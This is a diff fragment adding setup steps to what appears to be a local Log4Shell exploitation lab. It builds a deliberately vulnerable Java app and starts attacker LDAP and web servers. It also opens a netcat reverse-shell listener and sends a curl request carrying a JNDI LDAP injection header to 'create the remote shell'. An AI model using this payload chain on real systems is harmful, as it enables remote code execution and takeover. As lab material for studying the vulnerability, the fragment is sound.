@@ -25,3 +25,26 @@ git clone https://github.com/christophetd/log4shell-vulnerable-app
 cd log4shell-vulnerable-app
 gradle bootJar --no-daemon
 
+# copy java jar
+mkdir /app
+cp build/libs/*.jar /app/spring-boot-application.jar
+
+# python requirements
+python3 -m pip install -r requirements.txt
+
+# python ldap server (note webserver hard coded to 8001)
+openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/C=US/ST=California/L=San Francisco/O=Example Inc./OU=IT Department/CN=example.com"
+python3 ldap.py 8000 &
+
+# python web server
+python3 web.py 8001 &
+
+# java log4j vulnerable app (default is 8080)
+java -jar /app/spring-boot-application.jar &
+
+# shell catcher (this is hard coded in Exploit.java class)
+nc -nlv 4444
+
+# create the remote shell
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:8000/cn=bob,ou=people,dc=example,dc=org}'
+
